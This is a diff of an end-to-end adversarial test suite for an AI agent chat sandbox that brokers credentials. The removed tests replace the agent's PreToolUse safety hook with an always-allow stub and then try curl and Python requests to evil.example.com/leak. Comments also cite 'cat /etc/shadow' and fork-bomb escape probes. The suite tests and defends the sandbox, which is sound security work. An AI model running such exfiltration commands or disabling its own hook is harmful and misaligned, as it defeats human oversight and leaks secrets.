@@ -1,58 +1,63 @@
 """G.3 — adversarial suite: prompt injection, network policy, fuzz, replay,
-and (Task 11, 2026-07-14 incident hardening) the e2b-tier incident-closure
-assertions for the chat sandbox secret broker.
+and (Task 11, 2026-07-14 incident hardening) the sandbox-tier
+incident-closure assertions for the chat sandbox secret broker.
 
-Target model (current): **closed egress + brokered credentials**. Every
-sandbox VM's outbound network is restricted at the E2B level to an explicit
-allowlist (``ChatConfig.egress_allow_out`` → ``SandboxNetworkOpts.allow_out``,
-``app/chat/e2b_provider.py``), and no sandbox process ever holds a real
-Anthropic key or Agnes bearer token — the in-sandbox loopback relay
+Target model (current): **brokered credentials in a local docker sandbox**.
+Chat sessions run under the self-hosted docker provider
+(``app/chat/docker_provider.py`` — hardened containers spawned by the
+apps-runner sidecar), and no sandbox process ever holds a real Anthropic
+key or Agnes bearer token — the in-sandbox loopback relay
 (``app/chat/relay.py``) holds a short-lived, opaque, session-scoped ticket
 in memory only and presents it to the server's broker routes
 (``app/api/broker.py``), which resolve it to the caller's real identity and
-replay the request in-process. This REPLACES the earlier "Q4 fail-open"
-trade-off this file used to document: previously there was no VM-level
-firewall at all and the workspace's PreToolUse hook allowlist was the *only*
-thing standing between the agent and the open internet. That framing is
-gone — the hook is now defense-in-depth on top of a closed-by-default VM,
-not the last line of defense.
+replay the request in-process. Network policy is layered rather than
+VM-enforced: the workspace PreToolUse hook (section A) is defense-in-depth,
+and operators can close the network itself with
+``chat.docker_egress_mode: none|allowlist`` (an internal bridge with no
+route out — covered by the provider/sidecar unit tests, not this suite; the
+e2e stack runs the default ``open`` mode). The E2B microVM's per-hostname
+``allow_out`` firewall this file used to prove was removed together with
+the e2b provider (2026-08).
 
 Section layout:
   * A — PreToolUse hook (destructive-command + non-allowlist-host refusal).
-        Runs on any platform, no docker, no E2B billing.
+        Runs on any platform, no docker daemon, no sandbox spawn.
   * B — (intentionally empty; see note below)
-  * C — WebSocket framing fuzz (docker, no E2B/Anthropic).
-  * D — Slack HMAC signature bypass (docker, no E2B/Anthropic).
-  * E — JWT session replay (docker, no E2B/Anthropic).
-  * F — Task 11: e2b-tier incident-closure assertions (AC-F-*, the e2b rows
-        of AC-G-*). Real E2B sandbox required; some also need a real
-        Anthropic turn (marked ``@pytest.mark.real_llm`` on top of the
-        e2b gate) because the broker/relay only start on the non-fake-agent
-        runner path (``app/chat/runner.py:amain`` — fake-agent mode never
-        calls ``_start_relay``, so it never exercises the ticket broker).
+  * C — WebSocket framing fuzz (compose stack + sandbox spawn, no Anthropic).
+  * D — Slack HMAC signature bypass (compose stack only, no Anthropic).
+  * E — JWT session replay (compose stack + sandbox spawn, no Anthropic).
+  * F — Task 11: sandbox-tier incident-closure assertions (AC-F-*, the
+        sandbox rows of AC-G-*). Real docker sandbox required; all of them
+        also need a real Anthropic turn (marked ``@pytest.mark.real_llm``
+        on top of the docker gate) because the broker/relay only start on
+        the non-fake-agent runner path (``app/chat/runner.py:amain`` —
+        fake-agent mode never calls ``_start_relay``, so it never exercises
+        the ticket broker).
 
 Gating:
   * Section A — no gates, runs everywhere.
-  * Sections C/D/E — AGNES_E2E=1 (docker-compose stack), no E2B/Anthropic
-    spend (fake-agent-compatible).
-  * Section F — AGNES_E2E_E2B=1 (real E2B sandbox) on every test; the four
-    that need a live, real-agent chat session additionally require
-    AGNES_E2E_ANTHROPIC=1 (+ ANTHROPIC_API_KEY) via ``@pytest.mark.real_llm``.
-    Per the design spec (§7, "Release gate, honestly stated"), AC-F3 and
-    AC-F4c are the cheap **primary** operator-release-check criteria — they
-    need a real sandbox but no Anthropic key or LLM turn (they attempt
-    egress directly), so they're deliberately implemented as bare-sandbox
-    tests with no docker-compose/Anthropic dependency at all.
+  * Sections C/D/E — AGNES_E2E=1 (docker-compose stack); C and E also need
+    AGNES_E2E_DOCKER=1 (creating a chat session spawns a real sandbox, so
+    the apps-runner sidecar must be up and the agnes-chat-sandbox image
+    built). No Anthropic spend (fake-agent-compatible).
+  * Section F — AGNES_E2E_DOCKER=1 on every test, plus
+    AGNES_E2E_ANTHROPIC=1 (+ ANTHROPIC_API_KEY) via ``@pytest.mark.real_llm``
+    for the live-session criteria. AC-F3 and AC-F4c — the old bare-sandbox
+    E2B VM-level egress-block criteria — were deleted with the e2b provider
+    (2026-08): the mechanism they proved (``network.allow_out`` at the VM
+    boundary) no longer exists, and the docker analogue
+    (``docker_egress_mode``) is enforced by the sidecar and covered by unit
+    tests.
 """
 
 from __future__ import annotations
 
-import asyncio
 import json
 import os
 import re
 import secrets
 import shlex
+import subprocess
 import sys
 import time
 import urllib.error
@@ -149,15 +154,13 @@ def test_pre_tool_use_refuses_rm_against_workspace_snapshots() -> None:
 def test_pre_tool_use_refuses_curl_to_non_allowlisted_host() -> None:
     """Egress allowlist enforcement — hook-level defense-in-depth.
 
-    The VM-level allowlist (``ChatConfig.egress_allow_out`` →
-    ``SandboxNetworkOpts.allow_out``, enforced regardless of the hook —
-    see AC-F3/AC-F4c in section F below) is the *primary* egress control
-    now. This test exercises the hook's own allowlist (ALLOWED_HOSTS:
-    anthropic + github + loopback) as a second, independent layer: a hook
-    bug here would still be caught before the agent even tries the
-    network call, which is a better UX than waiting for the VM to refuse
-    the connection. Assert deny here; the VM-level tests in section F
-    prove the block also holds when this layer is bypassed entirely.
+    Under the docker provider the hook's own allowlist (ALLOWED_HOSTS:
+    anthropic + github + loopback) is the always-on egress layer; the
+    network-enforced one is opt-in (``chat.docker_egress_mode:
+    none|allowlist`` — an internal bridge with no route out, applied by
+    the apps-runner sidecar and covered by the provider/sidecar unit
+    tests). On the default ``open`` mode — what the e2e stack runs — the
+    hook is the layer that must deny here, so assert deny.
     """
     decision = _run_hook(
         {
@@ -174,17 +177,16 @@ def test_pre_tool_use_refuses_curl_to_non_allowlisted_host() -> None:
 # B. (intentionally empty)
 # ---------------------------------------------------------------------------
 #
-# The pre-E2B revision exercised the in-sandbox escape surface here
+# An early revision exercised the in-sandbox escape surface here
 # (`cat /etc/shadow`, `curl evil`, fork bomb) by spawning a real nsjail
-# subprocess on the host. Under E2B the sandbox is a remote microVM, and
-# the corresponding e2b-tier assertions now live in section F below
-# (test_hook_disabled_egress_blocked, test_non_bash_egress_blocked) —
-# the "burn real E2B sandbox minutes" cost the earlier revision of this
-# comment worried about is exactly what Task 11 (2026-07-14 incident
-# hardening) accepts for the manual e2b-tier operator gate: those two
-# assertions are deliberately the cheapest in section F (no Anthropic
-# spend, no docker-compose) so an operator can run them on every release
-# touching this surface.
+# subprocess on the host; the E2B era then moved that coverage to
+# remote-microVM assertions in section F. With the e2b provider removed
+# (2026-08) the sandbox is a local hardened container again — cap_drop
+# ALL, no-new-privileges, pids/mem/cpu limits, non-root user, applied
+# unconditionally by the apps-runner sidecar
+# (services/apps_runner/sandbox_api.py) — and the escape/egress coverage
+# lives in the provider + sidecar unit tests and in section F's broker
+# assertions below, not in a re-implemented section B.
 
 
 # ---------------------------------------------------------------------------
@@ -367,20 +369,23 @@ def test_jwt_for_session_a_cannot_open_session_b_ws(docker_e2e_agnes: str) -> No
 
 
 # ---------------------------------------------------------------------------
-# F. Task 11 (2026-07-14 incident hardening) — e2b-tier incident-closure
+# F. Task 11 (2026-07-14 incident hardening) — sandbox-tier incident-closure
 #    assertions for the chat sandbox secret broker.
 # ---------------------------------------------------------------------------
 #
 # See docs/superpowers/specs/2026-07-14-chat-sandbox-secret-broker-design.md
 # §7.1/§7.2 for the acceptance-criteria table these tests implement, and
 # docs/superpowers/plans/2026-07-14-chat-sandbox-secret-broker.md Task 11.
+# Originally written against the e2b provider; ported to the docker
+# provider when e2b was removed (2026-08) — the broker/relay/ticket model
+# under test is provider-agnostic, only the "reach into the sandbox"
+# plumbing changed (docker exec instead of the E2B SDK).
 #
-# Every test below is gated `@pytest.mark.skipif(not AGNES_E2E_E2B)`. The
-# four that need a live, real-agent chat session (not just a bare sandbox)
-# are additionally `@pytest.mark.real_llm` — the relay/broker only start on
-# the non-fake-agent runner path (app/chat/runner.py:amain), so a
-# fake-agent session would silently skip the thing under test rather than
-# prove it.
+# Every test below is gated `@pytest.mark.skipif(not AGNES_E2E_DOCKER)` and
+# needs a live, real-agent chat session, so each is additionally
+# `@pytest.mark.real_llm` — the relay/broker only start on the
+# non-fake-agent runner path (app/chat/runner.py:amain), so a fake-agent
+# session would silently skip the thing under test rather than prove it.
 
 
 def _skip_if_fake_agent_mode() -> None:
@@ -433,42 +438,46 @@ print('\\n'.join(r[0] for r in rows))
     return [line for line in out.splitlines() if line.strip()]
 
 
-async def _exec_in_sandbox(sandbox, cmd: str, *, timeout: float = 20.0) -> tuple[int, str, str]:
-    """Run one foreground shell command against an already-connected
-    ``e2b.AsyncSandbox``; normalize the two shapes the SDK can return.
-
-    e2b's foreground ``commands.run`` raises ``CommandExitException`` (a
-    ``CommandResult`` subclass with the same ``stdout``/``stderr``/
-    ``exit_code`` attributes) on a non-zero exit rather than returning a
-    result object with a non-zero ``exit_code`` — normalize both into one
-    ``(exit_code, stdout, stderr)`` tuple so callers don't need to know
-    which happened.
-    """
-    from e2b import CommandExitException
-
-    try:
-        result = await sandbox.commands.run(cmd, timeout=timeout)
-    except CommandExitException as exc:
-        return exc.exit_code, exc.stdout, exc.stderr
-    return result.exit_code, result.stdout, result.stderr
-
-
 def _run_in_sandbox(sandbox_id: str, cmd: str, *, timeout: float = 20.0) -> tuple[int, str, str]:
-    """Connect to an already-running E2B sandbox by id and run one foreground
-    shell command. Connecting is a lightweight handshake against a live
-    sandbox, not a new VM boot, so a fresh connect per call is cheap."""
-    from e2b import AsyncSandbox
+    """Run one foreground shell command inside a live chat-sandbox container.
 
-    async def _run() -> tuple[int, str, str]:
-        sandbox = await AsyncSandbox.connect(sandbox_id, api_key=os.environ["E2B_API_KEY"])
-        return await _exec_in_sandbox(sandbox, cmd, timeout=timeout)
+    Under the docker provider the persisted ``sandbox_id`` IS the container
+    name on the local daemon (``app/chat/docker_provider.py::container_name``,
+    ``agnes-chatsbx-…``), and the e2e stack's apps-runner sidecar spawns
+    sandboxes as siblings on that same daemon — so a plain ``docker exec``
+    from the test host lands in the exact container the session runs in,
+    as the container's own (non-root) user.
+    """
+    proc = subprocess.run(
+        ["docker", "exec", sandbox_id, "sh", "-lc", cmd],
+        capture_output=True,
+        timeout=timeout + 30.0,
+    )
+    return (
+        proc.returncode,
+        proc.stdout.decode("utf-8", "replace"),
+        proc.stderr.decode("utf-8", "replace"),
+    )
 
-    return asyncio.run(_run())
+
+#: `ps -eo pid,ppid,args --no-headers` equivalent for the slim sandbox image
+#: (python:3.13-slim ships no procps) — walks /proc and emits the same
+#: "pid ppid args" rows `_find_descendant_pids` parses. The ppid is field 4
+#: of /proc/<pid>/stat, extracted after stripping everything through the
+#: last ')' so a comm containing spaces/parens cannot shift the fields.
+_PROC_PS_CMD = (
+    "for d in /proc/[0-9]*; do "
+    "pid=${d#/proc/}; "
+    'ppid=$(sed "s/^.*) //" "$d/stat" 2>/dev/null | cut -d" " -f2); '
+    'args=$(tr "\\0" " " < "$d/cmdline" 2>/dev/null); '
+    '[ -n "$args" ] && echo "$pid $ppid $args"; '
+    "done; true"
+)
 
 
 def _find_descendant_pids(ps_out: str, root_pid: int) -> tuple[Optional[int], Optional[int]]:
-    """Parse ``ps -eo pid,ppid,args`` output; return ``(agent_pid, mcp_pid)``
-    among ``root_pid``'s descendants.
+    """Parse "pid ppid args" rows (``_PROC_PS_CMD`` output); return
+    ``(agent_pid, mcp_pid)`` among ``root_pid``'s descendants.
 
     ``root_pid`` is the runner process (``python runner.py`` — also where the
     loopback relay itself runs, see ``app/chat/relay.py``'s module docstring:
@@ -511,146 +520,34 @@ def _find_descendant_pids(ps_out: str, root_pid: int) -> tuple[Optional[int], Op
     return agent_pid, mcp_pid
 
 
-# --- AC-F3 / AC-F4c: bare-sandbox, no Anthropic key, no docker-compose ----
+# --- AC-F3 / AC-F4c — REMOVED with the e2b provider (2026-08) --------------
 #
-# Per the design spec §7 ("Release gate, honestly stated"), these two are
-# the cheap PRIMARY operator-release-check criteria: real E2B sandbox, no
-# LLM turn, no docker stack — just prove the VM-level allowlist blocks
-# egress regardless of what's (or isn't) running inside the sandbox.
+# `test_hook_disabled_egress_blocked` (AC-F3) and `test_non_bash_egress_blocked`
+# (AC-F4c) proved the E2B VM's per-hostname ``network.allow_out`` firewall
+# held with the PreToolUse hook disabled and for non-Bash clients. That
+# mechanism was deleted together with ``app/chat/e2b_provider.py``; the
+# docker provider's network-level analogue (``chat.docker_egress_mode:
+# none|allowlist`` — an internal bridge with no route out, plus the
+# egress-proxy sidecar in allowlist mode) is enforced by the apps-runner
+# sidecar and covered by tests/test_chat_docker_provider.py and the
+# services/egress_proxy tests, so the two criteria were retired rather than
+# ported. tests/test_incident_coverage_matrix.py dropped the matching
+# entries in the same change.
 
 
-@pytest.mark.skipif(not os.environ.get("AGNES_E2E_E2B"), reason="AGNES_E2E_E2B=1 required — needs a real E2B sandbox")
-def test_hook_disabled_egress_blocked() -> None:
-    """AC-F3 — VM-level egress block holds even with the PreToolUse hook
-    noop'd/rewritten.
-
-    Writes a permissive no-op hook at the conventional workspace path (the
-    attacker's presumed first move after compromising the workspace), then
-    attempts a plain ``curl`` to a host absent from the sandbox's
-    ``network.allow_out`` allowlist. The block must come from the E2B VM's
-    network policy (``app/chat/e2b_provider.py`` — ``AsyncSandbox.create(...,
-    network={"allow_out": [...]})``), which has no dependency on any
-    in-sandbox file at all — proving disabling the hook does not reopen
-    egress.
-    """
-    if not os.environ.get("E2B_API_KEY"):
-        pytest.skip("E2B_API_KEY not set — required for a real sandbox spawn")
-
-    async def _run() -> tuple[int, str, str]:
-        from app.chat.e2b_provider import E2BProvider
-
-        prov = E2BProvider(
-            api_key=os.environ["E2B_API_KEY"],
-            template_id=os.environ.get("E2B_TEMPLATE_ID", "agnes-chat"),
-            sandbox_timeout_seconds=120,
-            upload_runner=False,
-            # Deliberately excludes evil.example.com — proves the VM
-            # allowlist, not any in-sandbox hook, is what blocks the
-            # request below.
-            egress_allow_out=["api.anthropic.com"],
-        )
-        handle = await prov.spawn(workdir=Path("/tmp"), env={}, argv=["/bin/sh", "-c", "sleep 60"])
-        try:
-            # "Disable the hook": overwrite it with an always-allow no-op at
-            # the conventional workspace path. Nothing in this bare-sandbox
-            # test actually consults this file (there's no Claude Code Bash
-            # tool running here) — writing it is purely to mirror the AC-F3
-            # setup literally: even a hook an attacker fully controls cannot
-            # affect the outcome below.
-            noop_hook = '#!/usr/bin/env python3\nimport json\nprint(json.dumps({"permissionDecision": "allow"}))\n'
-            write_cmd = (
-                "mkdir -p /work/.claude/hooks && "
-                "cat > /work/.claude/hooks/pre_tool_use.py << 'HOOKEOF'\n"
-                f"{noop_hook}HOOKEOF\n"
-                "chmod +x /work/.claude/hooks/pre_tool_use.py"
-            )
-            await _exec_in_sandbox(handle._sandbox, write_cmd, timeout=15)
-
-            return await _exec_in_sandbox(
-                handle._sandbox,
-                "curl -sS --max-time 8 -o /dev/null -w '%{http_code}' https://evil.example.com/leak",
-                timeout=15,
-            )
-        finally:
-            await handle.kill()
-
-    exit_code, stdout, _stderr = asyncio.run(_run())
-    # curl's own exit code is non-zero on DNS/connect/timeout failure; "200"
-    # in stdout would mean the request actually completed successfully.
-    blocked = exit_code != 0 and "200" not in stdout
-    assert blocked, (
-        f"expected VM-level egress block to evil.example.com regardless of "
-        f"hook state; got exit={exit_code} stdout={stdout!r}"
-    )
-
-
-@pytest.mark.skipif(not os.environ.get("AGNES_E2E_E2B"), reason="AGNES_E2E_E2B=1 required — needs a real E2B sandbox")
-def test_non_bash_egress_blocked() -> None:
-    """AC-F4c — non-Bash egress is blocked too (proves the fix isn't Bash-
-    /hook-specific).
-
-    Attempts egress via a raw Python HTTP client rather than ``curl`` —
-    ``requests`` when available in the sandbox image, else the stdlib
-    ``urllib.request`` (still "not curl", still catches the exception
-    itself rather than relying on a shell exit code). Both paths reach the
-    network at the OS socket layer, same as any other process in the VM —
-    the E2B allowlist governs the VM, not any particular binary.
-    """
-    if not os.environ.get("E2B_API_KEY"):
-        pytest.skip("E2B_API_KEY not set — required for a real sandbox spawn")
-
-    async def _run() -> tuple[int, str, str]:
-        from app.chat.e2b_provider import E2BProvider
-
-        prov = E2BProvider(
-            api_key=os.environ["E2B_API_KEY"],
-            template_id=os.environ.get("E2B_TEMPLATE_ID", "agnes-chat"),
-            sandbox_timeout_seconds=120,
-            upload_runner=False,
-            egress_allow_out=["api.anthropic.com"],
-        )
-        handle = await prov.spawn(workdir=Path("/tmp"), env={}, argv=["/bin/sh", "-c", "sleep 60"])
-        try:
-            probe = (
-                "import sys\n"
-                "try:\n"
-                "    import requests as _lib\n"
-                "    def _get(u):\n"
-                "        return _lib.get(u, timeout=5)\n"
-                "except ImportError:\n"
-                "    import urllib.request as _lib\n"
-                "    def _get(u):\n"
-                "        return _lib.urlopen(u, timeout=5)\n"
-                "try:\n"
-                "    r = _get('http://evil.example.com/leak')\n"
-                "    print('REACHED', getattr(r, 'status_code', getattr(r, 'status', '?')))\n"
-                "except Exception as exc:\n"
-                "    print('BLOCKED', type(exc).__name__, str(exc)[:200])\n"
-                "    sys.exit(1)\n"
-            )
-            write_cmd = f"cat > /tmp/probe.py << 'PYEOF'\n{probe}PYEOF\n"
-            await _exec_in_sandbox(handle._sandbox, write_cmd, timeout=15)
-            return await _exec_in_sandbox(handle._sandbox, "python3 /tmp/probe.py", timeout=15)
-        finally:
-            await handle.kill()
-
-    exit_code, stdout, _stderr = asyncio.run(_run())
-    assert exit_code != 0 and "REACHED" not in stdout and "BLOCKED" in stdout, (
-        f"expected non-Bash (Python requests/urllib) egress to be blocked at "
-        f"the VM level; got exit={exit_code} stdout={stdout!r}"
-    )
-
-
-# --- Live-session criteria: real E2B + real Anthropic turn ----------------
+# --- Live-session criteria: real docker sandbox + real Anthropic turn -----
 #
-# These need the full stack (docker-compose Agnes server + a real E2B
-# sandbox + a real agent turn) because the relay/broker only start on the
-# non-fake-agent runner path — there is no way to exercise "no secret
-# anywhere" or "resume mints a fresh ticket" without a real spawned runner
-# actually holding tickets in memory.
+# These need the full stack (docker-compose Agnes server + apps-runner
+# sidecar + a real sandbox container + a real agent turn) because the
+# relay/broker only start on the non-fake-agent runner path — there is no
+# way to exercise "no secret anywhere" or "resume mints a fresh ticket"
+# without a real spawned runner actually holding tickets in memory.
 
 
-@pytest.mark.skipif(not os.environ.get("AGNES_E2E_E2B"), reason="AGNES_E2E_E2B=1 required — needs a real E2B sandbox")
+@pytest.mark.skipif(
+    not os.environ.get("AGNES_E2E_DOCKER"),
+    reason="AGNES_E2E_DOCKER=1 required — needs a real docker chat sandbox (apps-runner sidecar + built image)",
+)
 @pytest.mark.real_llm
 def test_no_secret_anywhere(docker_e2e_agnes: str) -> None:
     """AC-F-nosecret (+ AC-F1/AC-F2a/AC-F2b invariant) — no real credential
@@ -692,7 +589,7 @@ def test_no_secret_anywhere(docker_e2e_agnes: str) -> None:
         "either _start_relay didn't run, or this probe read the wrong pid"
     )
 
-    _, ps_out, _ = _run_in_sandbox(sandbox_id, "ps -eo pid,ppid,args --no-headers")
+    _, ps_out, _ = _run_in_sandbox(sandbox_id, _PROC_PS_CMD)
     agent_pid, mcp_pid = _find_descendant_pids(ps_out, runner_pid)
 
     probes: dict[str, tuple[str, str]] = {"relay/runner": (environ_runner, cmdline_runner)}
@@ -771,7 +668,10 @@ for c in sorted(cand):
 """
 
 
-@pytest.mark.skipif(not os.environ.get("AGNES_E2E_E2B"), reason="AGNES_E2E_E2B=1 required — needs a real E2B sandbox")
+@pytest.mark.skipif(
+    not os.environ.get("AGNES_E2E_DOCKER"),
+    reason="AGNES_E2E_DOCKER=1 required — needs a real docker chat sandbox (apps-runner sidecar + built image)",
+)
 @pytest.mark.real_llm
 def test_no_real_anthropic_key_in_process_memory(docker_e2e_agnes: str) -> None:
     """AC-F-nosecret (memory leg) — the real Anthropic key is absent from the
@@ -793,6 +693,13 @@ def test_no_real_anthropic_key_in_process_memory(docker_e2e_agnes: str) -> None:
     A self-canary (a unique literal in the scanner's own memory) is the
     positive control: if it is not found, memory reads were blocked and every
     negative assertion would pass vacuously, so the test fails instead.
+
+    Docker-provider caveat: the host kernel's Yama ``ptrace_scope`` (1 on
+    stock Ubuntu) applies inside the container too, so ``/proc/<pid>/mem``
+    of a NON-descendant same-UID process may be unreadable — in that case
+    the scan honestly degrades to self + descendants (the canary still
+    proves reads happened), which also means such a host blocks the very
+    attacker vector this test models.
     """
     _skip_if_fake_agent_mode()
     if not _WS_AVAILABLE:
@@ -838,7 +745,10 @@ def test_no_real_anthropic_key_in_process_memory(docker_e2e_agnes: str) -> None:
     )
 
 
-@pytest.mark.skipif(not os.environ.get("AGNES_E2E_E2B"), reason="AGNES_E2E_E2B=1 required — needs a real E2B sandbox")
+@pytest.mark.skipif(
+    not os.environ.get("AGNES_E2E_DOCKER"),
+    reason="AGNES_E2E_DOCKER=1 required — needs a real docker chat sandbox (apps-runner sidecar + built image)",
+)
 @pytest.mark.real_llm
 def test_no_exfil_via_allowlisted_host(docker_e2e_agnes: str) -> None:
     """AC-F-allowed-sink — a write reachable with the session's own
@@ -911,14 +821,18 @@ print(len(hits))
     )
 
 
-@pytest.mark.skipif(not os.environ.get("AGNES_E2E_E2B"), reason="AGNES_E2E_E2B=1 required — needs a real E2B sandbox")
+@pytest.mark.skipif(
+    not os.environ.get("AGNES_E2E_DOCKER"),
+    reason="AGNES_E2E_DOCKER=1 required — needs a real docker chat sandbox (apps-runner sidecar + built image)",
+)
 @pytest.mark.real_llm
 def test_egress_allow_legit(docker_e2e_agnes: str) -> None:
     """AC-G-egress-allow — legitimate Anthropic + Agnes traffic still works
-    end to end through the broker. Closing egress and brokering credentials
-    is only a win if the happy path doesn't regress: a normal session does
-    a real model turn and an ``agnes catalog`` tool call, and both must
-    succeed with no broker/relay error frame surfacing to the client.
+    end to end through the broker. Brokering credentials (and any egress
+    tightening the operator layers on) is only a win if the happy path
+    doesn't regress: a normal session does a real model turn and an
+    ``agnes catalog`` tool call, and both must succeed with no broker/relay
+    error frame surfacing to the client.
     """
     _skip_if_fake_agent_mode()
     if not _WS_AVAILABLE:
@@ -951,7 +865,10 @@ def test_egress_allow_legit(docker_e2e_agnes: str) -> None:
     assert (assistant.get("content") or "").strip(), "expected a non-empty assistant reply for the legit-egress smoke"
 
 
-@pytest.mark.skipif(not os.environ.get("AGNES_E2E_E2B"), reason="AGNES_E2E_E2B=1 required — needs a real E2B sandbox")
+@pytest.mark.skipif(
+    not os.environ.get("AGNES_E2E_DOCKER"),
+    reason="AGNES_E2E_DOCKER=1 required — needs a real docker chat sandbox (apps-runner sidecar + built image)",
+)
 @pytest.mark.real_llm
 def test_resume_uses_fresh_ticket(docker_e2e_agnes: str) -> None:
     """AC-G-resume-fresh — resume mints and uses a fresh ticket, never a
@@ -960,11 +877,10 @@ def test_resume_uses_fresh_ticket(docker_e2e_agnes: str) -> None:
 
     Only exercises something real when the stack pauses (rather than
     kills) a detached session (``chat.on_detach: pause`` — the default,
-    but the shared e2e stack's ``instance.yaml.e2e`` currently sets the
-    deprecated ``e2b_kill_on_ws_disconnect: true``, which resolves to
-    ``on_detach: kill``). Checks the live server config instead of
-    assuming it, so a stack running the kill profile skips with an
-    actionable reason instead of failing confusingly.
+    and what the shared e2e stack's ``instance.yaml.e2e`` sets
+    explicitly). Checks the live server config instead of assuming it, so
+    a stack running the kill profile skips with an actionable reason
+    instead of failing confusingly.
     """
     _skip_if_fake_agent_mode()
     if not _WS_AVAILABLE:
@@ -1037,24 +953,26 @@ def test_resume_uses_fresh_ticket(docker_e2e_agnes: str) -> None:
 # Notes for the operator running this suite for the first time
 # ---------------------------------------------------------------------------
 #
+# One-time setup for anything that spawns sandboxes (sections C/E/F):
+#
+#   docker build -t agnes-chat-sandbox:latest \
+#     app/initial_workspace_default/docker-sandbox
+#
+# (the compose stack in tests/e2e/docker-compose.e2e.yml brings up the
+# apps-runner sidecar itself.)
+#
 # Sections A/C/D/E — deterministic, fake-agent-compatible:
 #
 #   ANTHROPIC_API_KEY=sk-... \
-#   AGNES_E2E=1 AGNES_E2E_FAKE_AGENT=1 \
+#   AGNES_E2E=1 AGNES_E2E_DOCKER=1 AGNES_E2E_FAKE_AGENT=1 \
 #   .venv/bin/pytest tests/e2e/test_adversarial.py -v
 #
-# Section F (Task 11 e2b-tier incident-closure gate) — the two PRIMARY,
-# cheap criteria (no Anthropic spend, no docker stack):
+# Section F (Task 11 sandbox-tier incident-closure gate) — real-agent
+# criteria (real Anthropic spend; run before any release touching
+# app/chat/**):
 #
-#   AGNES_E2E_E2B=1 E2B_API_KEY=e2b_... \
-#   .venv/bin/pytest tests/e2e/test_adversarial.py \
-#     -k "test_hook_disabled_egress_blocked or test_non_bash_egress_blocked" -v
-#
-# Section F — the full set, including the four real-agent criteria (real
-# Anthropic spend; run before any release touching app/chat/**):
-#
-#   ANTHROPIC_API_KEY=sk-ant-... E2B_API_KEY=e2b_... \
-#   AGNES_E2E=1 AGNES_E2E_E2B=1 AGNES_E2E_ANTHROPIC=1 \
+#   ANTHROPIC_API_KEY=sk-ant-... \
+#   AGNES_E2E=1 AGNES_E2E_DOCKER=1 AGNES_E2E_ANTHROPIC=1 \
 #   .venv/bin/pytest tests/e2e/test_adversarial.py -v
 #
 # Expected output: every test passes (or skips with a clear reason when
